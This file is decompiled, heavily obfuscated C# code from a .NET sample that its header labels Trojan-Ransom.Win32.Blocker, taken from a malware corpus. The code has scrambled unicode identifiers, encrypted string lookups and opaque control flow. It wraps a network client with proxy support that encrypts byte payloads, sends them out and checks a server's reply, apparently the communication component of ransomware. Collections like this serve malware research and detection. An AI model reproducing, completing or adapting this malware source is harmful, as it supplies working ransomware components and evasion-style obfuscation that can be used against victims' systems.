// Decompiled with JetBrains decompiler
// Type: .
// Assembly: BOMBS, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b01670ee6fa4859f
// MVID: D5D8F5B0-12EB-4325-8C3D-C60F341D062A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.jjta-28a226e15e1e7b94528e46718041b3f49976b446eb3daccd652d0e5b43f948be.exe

using \u0004;
using \u0006;
using System;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;

namespace \u0004
{
  internal class \u0007
  {
    private IWebProxy \u0001;
    private \u0008.\u0003 \u0001;
    [NonSerialized]
    internal static \u000F.\u0001 \u0004;

    internal bool \u0001([In] byte[] obj0, [In] \u0007.\u0003 obj1)
    {
      byte[] numArray1;
      bool flag1;
      bool flag2;
      \u0001.\u0006 obj2;
      byte[] numArray2;
      \u0007.\u0001 obj3;
      try
      {
        try
        {
          if (true)
          {
            numArray1 = \u0004.\u0003.\u0002(obj0);
            goto label_13;
          }
          else
            goto label_13;
        }
        catch (Exception ex)
        {
          this.\u0001(\u0003.\u0003.\u0001, \u0004.\u0003.\u0001);
          flag1 = false;
          goto label_11;
        }
label_3:
        int num;
        if (true)
        {
          if (numArray2 != null)
          {
            this.\u0001(\u0003.\u0003.\u0002);
            goto label_6;
          }
          else
          {
            this.\u0001(\u0003.\u0003.\u0001, \u0006.\u0006.\u0001);
            num = 0;
          }
        }
        else
          goto label_9;
label_4:
        flag2 = num != 0;
        goto label_17;
label_6:
        obj2 = new \u0001.\u0006(\u0007.\u0004(3087892));
        if (this.\u0001 != null)
          obj2.\u0001(this.\u0001);
        obj3 = new \u0007.\u0001(this, numArray2, obj2, obj1);
label_9:
        obj2.\u0001(new \u0005.\u0004(obj3.\u0001));
        num = obj3.\u0001 ? 1 : 0;
        if (true)
        {
          flag2 = num != 0;
          goto label_17;
        }
        else
          goto label_4;
label_11:
        if (true)
        {
          flag2 = flag1;
          if (false)
            goto label_6;
          else
            goto label_17;
        }
        else
          goto label_3;
label_13:
        numArray2 = \u0006.\u0006.\u0001(numArray1, \u0007.\u0004(3087566));
        goto label_3;
      }
      catch (Exception ex)
      {
        byte[] numArray3 = numArray1;
        byte[] numArray4 = numArray2;
        \u0001.\u0006 obj4 = obj2;
        \u0007.\u0001 obj5 = obj3;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local = (ValueType) flag1;
        byte[] numArray5 = obj0;
        \u0007.\u0003 obj6 = obj1;
        \u0001.\u0003.\u0001(ex, (object) numArray3, (object) numArray4, (object) obj4, (object) obj5, (object) local, (object) this, (object) numArray5, (object) obj6);
        throw;
      }
label_17:
      return flag2;
    }

    [SpecialName]
    public void \u0001([In] \u0008.\u0003 obj0)
    {
      \u0008.\u0003 obj1;
      \u0008.\u0003 comparand;
      \u0008.\u0003 obj2;
      try
      {
        obj2 = this.\u0001;
        do
        {
          comparand = obj2;
          obj1 = (\u0008.\u0003) \u0090.\u0008\u0003((Delegate) comparand, (Delegate) obj0);
          obj2 = Interlocked.CompareExchange<\u0008.\u0003>(ref this.\u0001, obj1, comparand);
        }
        while (obj2 != comparand);
      }
      catch (Exception ex)
      {
        \u0008.\u0003 obj3 = obj2;
        \u0008.\u0003 obj4 = comparand;
        \u0008.\u0003 obj5 = obj1;
        \u0008.\u0003 obj6 = obj0;
        \u0001.\u0003.\u0001(ex, (object) obj3, (object) obj4, (object) obj5, (object) this, (object) obj6);
        throw;
      }
    }

    protected void \u0001([In] \u0003.\u0003 obj0, [In] string obj1, [In] string obj2)
    {
      \u0008.\u0003 obj3;
      try
      {
        do
        {
          obj3 = this.\u0001;
          if (obj3 == null)
            goto label_2;
        }
        while (false);
        goto label_3;
label_2:
        return;
label_3:
        obj3((object) this, new \u0007(obj0, obj1, obj2));
      }
      catch (Exception ex)
      {
        \u0008.\u0003 obj4 = obj3;
        // ISSUE: variable of a boxed type
        __Boxed<\u0003.\u0003> local = (System.Enum) obj0;
        string str1 = obj1;
        string str2 = obj2;
        \u0001.\u0003.\u0001(ex, (object) obj4, (object) this, (object) local, (object) str1, (object) str2);
        throw;
      }
    }

    protected void \u0001([In] \u0003.\u0003 obj0, [In] string obj1)
    {
      try
      {
        int num = (int) obj0;
        string str = obj1;
        string empty = string.Empty;
        if (false)
          return;
        this.\u0001((\u0003.\u0003) num, str, empty);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<\u0003.\u0003> local = (System.Enum) obj0;
        string str = obj1;
        \u0001.\u0003.\u0001(ex, (object) this, (object) local, (object) str);
        throw;
      }
    }

    protected void \u0001([In] \u0003.\u0003 obj0)
    {
      try
      {
        if (false)
          return;
        this.\u0001(obj0, string.Empty);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<\u0003.\u0003> local = (System.Enum) obj0;
        \u0001.\u0003.\u0001(ex, (object) this, (object) local);
        throw;
      }
    }

    static \u0007() => \u0002.\u0001(typeof (\u0007));

    private sealed class \u0001
    {
      private readonly \u0007 \u0001;
      private readonly byte[] \u0001;
      private readonly \u0001.\u0006 \u0001;
      private readonly \u0007.\u0003 \u0001;
      public bool \u0001 = true;
      [NonSerialized]
      internal static \u000F.\u0001 \u0098;

      public \u0001([In] \u0007 obj0, [In] byte[] obj1, [In] \u0001.\u0006 obj2, [In] \u0007.\u0003 obj3)
      {
        try
        {
          this.\u0001 = obj0;
          this.\u0001 = obj3;
          this.\u0001 = obj2;
          this.\u0001 = obj1;
        }
        catch (Exception ex)
        {
          \u0007 obj4 = obj0;
          byte[] numArray = obj1;
          \u0001.\u0006 obj5 = obj2;
          \u0007.\u0003 obj6 = obj3;
          \u0001.\u0003.\u0001(ex, (object) this, (object) obj4, (object) numArray, (object) obj5, (object) obj6);
          throw;
        }
      }

      public void \u0001([In] string obj0)
      {
        byte[] numArray1;
        byte[] numArray2;
        \u0007.\u0002 obj1;
        string str1;
        try
        {
          int num = \u0082.\u008D\u0002(obj0, \u0007.\u0001.\u0098(3087947)) ? 1 : 0;
          if (true)
          {
            if (num == 0)
            {
              str1 = obj0;
              if (this.\u0001.\u0001 != null)
                this.\u0001.\u0001((object) this, new \u0007(\u0003.\u0003.\u0002, str1));
              this.\u0001 = false;
              return;
            }
            this.\u0001.\u0001(\u0003.\u0003.\u0003);
            if (true)
            {
              numArray1 = \u0018.\u007E\u0010\u0002((object) \u0017.\u0008\u0002(), \u0007.\u0001.\u0098(3087952));
              num = numArray1.Length;
            }
            else
              goto label_5;
          }
          numArray2 = new byte[num + this.\u0001.Length];
          \u0091.\u000E\u0003((Array) numArray1, (Array) numArray2, numArray1.Length);
          \u008A.\u0002\u0003((Array) this.\u0001, 0, (Array) numArray2, numArray1.Length, this.\u0001.Length);
          if (true)
            obj1 = new \u0007.\u0002(this.\u0001);
label_5:
          this.\u0001.\u0001(numArray2, this.\u0001.\u0003(), this.\u0001.\u0002(), this.\u0001.\u0001(), new \u0005.\u0004(obj1.\u0001));
          this.\u0001 = obj1.\u0001;
        }
        catch (Exception ex)
        {
          byte[] numArray3 = numArray1;
          byte[] numArray4 = numArray2;
          \u0007.\u0002 obj2 = obj1;
          string str2 = str1;
          string str3 = obj0;
          \u0001.\u0003.\u0001(ex, (object) numArray3, (object) numArray4, (object) obj2, (object) str2, (object) this, (object) str3);
          throw;
        }
      }

      static \u0001() => \u0002.\u0001(typeof (\u0007.\u0001));
    }

    private sealed class \u0002
    {
      private readonly \u0007 \u0001;
      public bool \u0001;
      [NonSerialized]
      internal static \u000F.\u0001 \u009F;

      public \u0002([In] \u0007 obj0)
      {
        try
        {
          this.\u0001 = obj0;
        }
        catch (Exception ex)
        {
          \u0007 obj = obj0;
          \u0001.\u0003.\u0001(ex, (object) this, (object) obj);
          throw;
        }
      }

      public void \u0001([In] string obj0)
      {
        try
        {
          if (global::\u0003.\u007E\u0019((object) obj0, \u0007.\u0002.\u009F(3088008)))
          {
            this.\u0001.\u0001(\u0003.\u0003.\u0003, obj0);
            this.\u0001 = false;
          }
          else
          {
            this.\u0001.\u0001(\u0003.\u0003.\u0004, string.Empty, obj0);
            this.\u0001 = true;
          }
        }
        catch (Exception ex)
        {
          string str = obj0;
          \u0001.\u0003.\u0001(ex, (object) this, (object) str);
          throw;
        }
      }

      static \u0002() => \u0002.\u0001(typeof (\u0007.\u0002));
    }

    internal sealed class \u0003
    {
      public static \u0007.\u0003 \u0001;
      private readonly string \u0001;
      private readonly string \u0002;
      private readonly string \u0003;

      public \u0003([In] string obj0, [In] string obj1, [In] string obj2)
      {
        try
        {
          this.\u0001 = obj0;
          this.\u0003 = obj2;
          this.\u0002 = obj1;
        }
        catch (Exception ex)
        {
          string str1 = obj0;
          string str2 = obj1;
          string str3 = obj2;
          \u0001.\u0003.\u0001(ex, (object) this, (object) str1, (object) str2, (object) str3);
          throw;
        }
      }

      [SpecialName]
      public string \u0001()
      {
        string str;
        try
        {
          str = this.\u0003;
        }
        catch (Exception ex)
        {
          \u0001.\u0003.\u0001(ex, (object) this);
          throw;
        }
        return str;
      }

      [SpecialName]
      public string \u0002()
      {
        string str;
        try
        {
          str = this.\u0002;
        }
        catch (Exception ex)
        {
          \u0001.\u0003.\u0001(ex, (object) this);
          throw;
        }
        return str;
      }

      [SpecialName]
      public string \u0003()
      {
        string str;
        try
        {
          str = this.\u0001;
        }
        catch (Exception ex)
        {
          \u0001.\u0003.\u0001(ex, (object) this);
          throw;
        }
        return str;
      }

      static \u0003()
      {
        try
        {
          \u0007.\u0003.\u0001 = new \u0007.\u0003((string) null, (string) null, (string) null);
        }
        catch (Exception ex)
        {
          \u0001.\u0003.\u0001(ex);
          throw;
        }
      }
    }
  }
}
